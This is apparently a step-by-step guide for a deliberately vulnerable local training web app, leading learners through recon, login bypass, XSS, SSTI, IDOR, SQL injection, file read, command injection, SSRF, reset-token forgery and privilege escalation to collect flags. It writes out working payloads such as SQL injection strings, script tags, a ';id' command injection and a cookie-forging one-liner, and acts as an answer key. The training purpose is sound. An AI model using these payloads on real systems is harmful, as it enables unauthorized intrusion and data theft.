SecureCorp Lab Guide

Follow the phases in order. Each phase tells you what to do, what to collect, and has expandable step-by-step hints if you get stuck.

Hidden pages exist on this lab — you will need to discover them yourself. Expand Hints under each phase when stuck.

Progress checklist — 17 items

Every labeled value you find maps to a field on the hidden submission form. Collect these as you go:

Auth Username · Bypass method · Admin password · Dashboard flag · Internal token · Cookie role
Web attacks XSS canary · Stored XSS (yes) · IDOR · LFI · CMDi · SSRF · Backup flag · Reset flag · SSTI · Profile flag · Report SQLi

Before you start

python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
VULNLAB_RESET=1 python app.py

Open http://127.0.0.1:5000

Recommended tools: Browser DevTools (Network + Application tabs), Burp Suite or OWASP ZAP, curl.

Phase 1 — Reconnaissance

Goal: Map the application and find information the developers did not intend to expose.

Tools: Browser · View Page Source · curl or browser address bar
  1. Explore every page linked from the homepage and navigation. Keep a list of URLs and forms.
  2. Inspect HTML source on key pages — look for comments, hidden fields, and hard-coded hints.
  3. Check whether the site exposes any standard discovery files that list hidden paths.
  4. Probe for JSON or API endpoints that return structured data.
  5. Follow any internal document or file features and note how filenames are passed to the server.
Collect now: Backup config flag · XSS canary flag (both appear in leaked configuration)

Done when: You have found a leaked config file with at least two labeled VULN{...} values and noted paths to revisit later.

Step-by-step hints — Phase 1
1. Find robots.txt
  1. Go to http://127.0.0.1:5000/robots.txt
  2. Read the Disallow: lines — these are paths the site owner tried to hide
  3. Note /backup/, /backup/config.bak, /internal/, /api/user/, /api/reports
2. Read the leaked backup config
  1. Go to http://127.0.0.1:5000/backup/config.bak
  2. Find lines labeled Backup config flag and XSS canary flag
  3. Copy both VULN{...} values — you will enter them on /check later
  4. Also note INTERNAL_HEALTH_URL — you will need it in Phase 7
3. Browse documents
  1. Sign in first (guest credentials are in the login page source)
  2. Click Documents in the nav (or go to /documents)
  3. Click each filename — they open in /files?name=...
  4. Read deployment_notes.txt — it notes the network diagnostics tool runs shell commands
4. Guest account in page source
  1. Go to /login → View Source
  2. Search for guest — a developer comment reveals test credentials

Phase 2 — Login & admin access

Goal: Bypass or abuse authentication and reach administrator-only content.

Tools: Burp Suite or OWASP ZAP · DevTools → Network tab · DevTools → Application → Cookies
  1. Try logging in with valid-looking and invalid usernames. Compare error messages carefully.
  2. Capture the login request in an intercept proxy. Inspect every parameter — including ones not visible on the form.
  3. Attempt at least one bypass technique (request tampering, injection, or cookie editing).
  4. Once elevated, open the dashboard and record every labeled secret shown.
Collect now: Admin password · Dashboard flag · Internal token · Cookie role · Username · Bypass method

Done when: The dashboard shows administrator resources with labeled values you can copy.

Step-by-step hints — Phase 2
Method A — Hidden role field (easiest)
  1. Open Burp/ZAP or DevTools → Network tab
  2. Go to /login, enter any username/password, submit
  3. Find the POST request — body looks like: username=...&password=...&role=user
  4. Change role=user to role=admin
  5. Forward/resend the request → you land on dashboard as admin
  6. On /check, set Bypass method to hidden role
Method B — SQL injection
  1. On login, set username to: ' OR '1'='1' --
  2. Password can be anything
  3. Also change hidden role to admin via intercept (SQLi alone gives user role)
  4. On /check, set Bypass method to sqli
Method C — Cookie tampering
  1. Log in normally as guest / guest123
  2. DevTools → Application → Cookies → copy vulnlab_session
  3. Decode URL-safe base64 → JSON like {"username":"guest","role":"user"}
  4. Change to {"username":"guest","role":"admin"}, re-encode, replace cookie
  5. Reload /dashboard
  6. On /check, set Bypass method to cookie tamper and Cookie role to admin
python3 -c "import base64,json; p={'username':'guest','role':'admin'}; print(base64.urlsafe_b64encode(json.dumps(p,separators=(',',':')).encode()).decode().rstrip('='))"
User enumeration
  1. Try login with username admin + wrong password → "Invalid password for that account."
  2. Try username fakeuser → "Unknown username."
  3. Or: curl "http://127.0.0.1:5000/api/check_user?username=admin"

Phase 3 — XSS (cross-site scripting)

Goal: Demonstrate both reflected and stored XSS somewhere on the portal.

Tools: Browser · harmless <script>alert(...)</script> payload
  1. Find a page that echoes your input back in the HTML response — test with a script payload.
  2. Find a page that saves your input and displays it to others later — test the same way.
  3. Confirm both payloads actually execute in the browser.
  4. Remember the XSS canary label from your recon phase for submission later.
Collect now: XSS canary flag · Stored XSS = yes (on submission form)

Done when: You have triggered both reflected and stored XSS at least once.

Step-by-step hints — Phase 3
Reflected XSS
  1. Go to Directory (/search)
  2. Search for: <script>alert(1)</script>
  3. If an alert pops up, reflected XSS works
Stored XSS
  1. Go to Feedback
  2. In the message field enter: <script>alert('stored')</script>
  3. Submit → reload page → alert should fire again
  4. On /check, set Stored XSS to Yes

Phase 4 — SSTI (server-side template injection)

Goal: Prove the server evaluates template syntax in user input and leak the labeled flag.

Tools: Browser address bar · curl (optional)
  1. Return to the searchable page from Phase 3. Try input that would be evaluated server-side if templating is in use.
  2. Confirm evaluation with a simple arithmetic expression before attempting to leak secrets.
  3. Extract the labeled SSTI flag from the response.
Collect now: SSTI flag

Done when: You have a labeled SSTI flag value saved.

Step-by-step hints — Phase 4
Full walkthrough
  1. Go to /search?q={{7*7}}
  2. You should see "Template preview: 49" — the server evaluated your input
  3. Now try /search?q={{ssti_flag}}
  4. Copy the VULN{...} value labeled SSTI flag

Phase 5 — IDOR

Goal: Access another user's data by manipulating an identifier in a request.

Tools: Browser · curl · sequential ID enumeration (1, 2, 3…)
  1. From recon, find an API that returns user profiles keyed by a numeric ID.
  2. Check whether the server verifies you are allowed to view each record.
  3. Walk through IDs until you reach an account with sensitive fields.
Collect now: IDOR flag

Done when: You have the labeled IDOR flag from another user's profile.

Step-by-step hints — Phase 5
Full walkthrough
  1. Open http://127.0.0.1:5000/api/user/1 in browser or curl
  2. Repeat for IDs 2 and 3
  3. User 3 (admin) has api_key containing the IDOR flag
  4. No login required — classic insecure direct object reference

Phase 6 — Report API SQL injection

Goal: Break out of a SQL query through a filter parameter on a hidden API.

Tools: Browser · curl · URL encoding awareness
  1. Locate the reports API from your recon notes.
  2. Send normal filter values first to understand the response shape.
  3. Inject into the filter parameter to return more rows than intended.
  4. Read the labeled flag that appears when the query returns all users.
Collect now: Report SQLi flag

Done when: The API response includes the report SQLi label.

Step-by-step hints — Phase 6
Full walkthrough
  1. Try: /api/reports?dept=SOC — returns one user
  2. Inject: /api/reports?dept=' OR '1'='1' --
  3. URL-encode if using browser: %27+OR+%271%27%3D%271%27+--
  4. Response includes report_flag when all users are returned

Phase 7 — Local file read

Goal: Read archived files through the document viewer parameter.

Tools: Browser · curl · document links from Phase 1
  1. Use the file viewer discovered during recon (linked from the documents section).
  2. Request filenames shown in the archive list, then try variations if needed.
  3. Copy the labeled LFI flag and read any deployment notes you find — they matter later.
Collect now: LFI flag

Done when: You have the LFI flag and have skimmed deployment-related notes.

Step-by-step hints — Phase 7
Full walkthrough
  1. curl "http://127.0.0.1:5000/files?name=backup_flag.txt"
  2. Also read deployment_notes.txt — needed for Phase 11

Phase 8 — Command injection

Goal: Append OS commands to input processed by a network diagnostic tool.

Tools: Browser form · curl with -X POST -d · shell metacharacters (; | &)
  1. Open the IT network diagnostics feature from the navigation.
  2. Submit a valid-looking host value first, then append command separators and a simple command.
  3. Find the labeled flag in the tool output.
Collect now: Command injection flag

Done when: Output shows both your injected command result and the labeled flag.

Step-by-step hints — Phase 8
Full walkthrough
  1. Host field: 127.0.0.1; id
  2. Or use curl: curl -X POST http://127.0.0.1:5000/tools/ping -d "host=127.0.0.1;id"
  3. Output includes the command injection flag after [debug]

Phase 9 — SSRF

Goal: Trick the server into fetching an internal URL on your behalf.

Tools: URL preview / fetch tool · curl · internal URL from leaked config
  1. Find the internal health URL from configuration you leaked in Phase 1.
  2. Locate the server-side URL fetch feature (linked from network tools).
  3. Submit the internal URL so the server requests it — not your browser directly.
  4. Save the SSRF flag from the internal health response.
Collect now: SSRF flag

Done when: You have the SSRF label saved.

Step-by-step hints — Phase 9
Full walkthrough
  1. From backup config copy: http://127.0.0.1:5000/internal/health
  2. Go to URL Preview (/fetch) or: /fetch?url=http://127.0.0.1:5000/internal/health
  3. The server fetches it — you see JSON with ssrf_flag
  4. Copy the SSRF flag value for /check

Phase 10 — Password reset

Goal: Approve a password reset by forging a predictable token.

Tools: Browser · Python shell (optional, for encoding) · curl (optional)
  1. Use the password reset page to generate a link for a known username.
  2. Analyze how the token is built — is it random or derived from the username?
  3. Forge a valid token and visit the reset URL to retrieve the labeled flag.
Collect now: Password reset flag

Done when: Reset page confirms success and shows the labeled flag.

Step-by-step hints — Phase 10
Full walkthrough
  1. Go to Reset Password, enter username admin, submit
  2. Token = URL-safe base64 of username: YWRtaW4 for admin
  3. Visit: /reset?user=admin&token=YWRtaW4
  4. Copy the password reset flag from the success message

Phase 11 — Profile escalation

Goal: Escalate privileges by tampering with a hidden profile form field.

Tools: Burp Suite or OWASP ZAP · DevTools → Network tab · valid login session
  1. Sign in with any account and open the profile editor from the dashboard.
  2. Intercept the profile save request in your proxy.
  3. Look for hidden parameters the UI does not show and try elevating them.
Collect now: Profile escalation flag

Done when: The profile page confirms escalation and displays the labeled flag.

Step-by-step hints — Phase 11
Full walkthrough
  1. Sign in as guest / guest123
  2. Go to /profile
  3. Intercept POST — body includes hidden access_level=standard
  4. Change to access_level=admin, forward request
  5. Page shows the profile escalation flag

Phase 12 — Submit everything

Goal: Enter all 17 labeled values on the hidden submission form and score full marks.

Tools: Browser · your collected notes from every prior phase
  1. Find the submission form — it is not linked from the main site.
  2. Match each label you collected to the same field name on the form.
  3. For boolean fields (Stored XSS), submit Yes only if you confirmed the attack worked.
  4. Submit and review the pass/fail breakdown.

Done when: The form reports 17/17 complete.

Step-by-step hints — Phase 12
Submission form
  1. Open /check
  2. Field labels match exactly what you saw on the site (e.g. "Dashboard flag", "SSTI flag")
  3. Bypass method accepts: sqli, hidden role, cookie tamper, etc.
